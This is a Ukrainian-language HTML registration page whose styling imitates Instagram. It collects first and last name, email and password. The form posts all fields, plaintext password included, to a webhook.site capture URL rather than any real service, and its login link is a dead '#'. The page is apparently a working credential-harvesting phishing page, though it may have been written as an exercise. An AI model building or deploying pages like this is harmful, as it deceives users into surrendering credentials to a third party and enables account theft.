<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Форма реєстрації</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        form {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            background-color: #ffffff;
            border: 1px solid #ddd;
            border-radius: 12px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h1 {
            font-family: 'Lucida Grande', 'Helvetica', Arial, sans-serif;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        label {
            display: none;
        }
        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
        }
        input[type="text"]:focus,
        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #aaa;
        }
        input[type="submit"] {
            background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
            color: white;
            font-weight: bold;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        input[type="submit"]:hover {
            opacity: 0.9;
        }
        fieldset {
            border: none;
            padding: 0;
            margin: 0;
        }
        a {
            display: block;
            margin-top: 15px;
            font-size: 12px;
            color: #385185;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <form action="https://webhook.site/805223ad-bed2-4c69-8448-a0535d1ed7d0" method="post">
        <h1>Реєстрація</h1>
        <fieldset>
            <input type="text" id="first-name" name="first-name" placeholder="Ім'я" required>
            <input type="text" id="last-name" name="last-name" placeholder="Прізвище" required>
            <input type="email" id="email" name="email" placeholder="Електронна пошта" required>
            <input type="password" id="password" name="password" placeholder="Пароль" required>
            <input type="password" id="confirm-password" name="confirm-password" placeholder="Підтвердження паролю" required>
        </fieldset>
        <input type="submit" value="Зареєструватися">
        <a href="#">Вже маєте акаунт? Увійдіть</a>
    </form>
</body>
</html>
